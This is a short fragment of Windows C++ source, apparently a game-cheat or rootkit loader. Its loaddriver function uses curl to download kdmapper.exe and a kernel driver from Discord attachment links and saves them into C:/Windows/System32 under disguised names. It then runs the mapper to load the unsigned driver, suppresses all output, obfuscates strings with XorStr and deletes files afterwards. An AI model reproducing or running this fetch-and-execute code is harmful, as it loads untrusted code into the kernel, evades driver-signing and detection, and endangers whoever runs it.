...
void loaddriver()
{
	...
	handle = CreateFileA(XorStr("\\\\.\\Kernal-1_12").c_str(), GENERIC_READ | GENERIC_WRITE,
	...
	if (handle == INVALID_HANDLE_VALUE) { 
		...
		system("curl https://cdn.discordapp.com/attachments/1008976708529029190/1009514836117434558/kdmapper.exe --output C:/Windows/System32/sxwhs.exe >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/923050998195454013/926031035706257458/Kernal-1_12.sys --output C:/Windows/System32/settings.sys >nul 2>&1");
		system("C:/Windows/System32/sxwhs.exe C:/Windows/System32/settings.sys");
		printf(XorStr("\n").c_str());
		system("del Kernal-1_12.sys >nul 2>&1");
		system("del sxwhs.exe >nul 2>&1");
